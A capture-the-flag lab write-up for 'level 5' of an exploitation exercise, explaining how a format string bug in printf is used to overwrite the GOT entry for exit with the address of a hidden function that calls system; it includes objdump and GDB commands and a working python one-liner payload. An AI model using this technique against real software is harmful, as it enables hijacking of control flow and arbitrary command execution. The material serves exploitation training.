# LEVEL 5

## 💡 Explanation

In this level we have to:
1. Checking a bit the main we see that it call a function `n`, which is a simple `fget`, `printf` and `exit`; from what we have learnt on the last exercises we can deduce that the exploit will be on the `printf`.
2. By having a look to the objdump of the binary we can see that there is a funtion `o` which is present but it is not called neither by the main nor by the function `n` (as on the level1). This function contains a call to `system` which looks suspicious. We are going to try to execute the function `o`.
3. The way of doing so is by replacing the address of `exit` (the function called right after `printf`) by the address of the function `o` on the Global Offset Table (GOT), so since the program's next instruction is `exit()` it will go to look for its real address on the GOT and it will find the address of `o` and then execute it.
4. The exploit looks like this [ADDRESS OF EXIT AT GOT][ADDRESS OF FUNCT O][%N FORMATTER]. We find that the `exit` function address is saved in the address 0x08049838 of the GOT, there is where we have to write. What we have to write is the address of our `o`: 0x080484a4 (134513828) in decimal. And then we just check were in the stack we have to write. Voilà!

## 👾 Commands

To find the solution:
```
[VM]  objdump -s -j .got.plt /home/user/level5/level5
[VM]  objdump -R /home/user/level5/level5
[GDB] info functions
```

To execute the solution:
- `(python -c 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"' ; cat - ) | /home/user/level5/level5`

## 🔍 Resources

- [Chaine de format - exploitation](https://www.root-me.org/fr/Documentation/Applicatif/Chaine-de-format-exploitation)
- [How to Hijack the Global Offset Table with pointers](https://www.exploit-db.com/papers/13203)
- [How to hijack the Global Offset Table with pointers for root shells](http://www.infosecwriters.com/text_resources/pdf/GOT_Hijack.pdf)
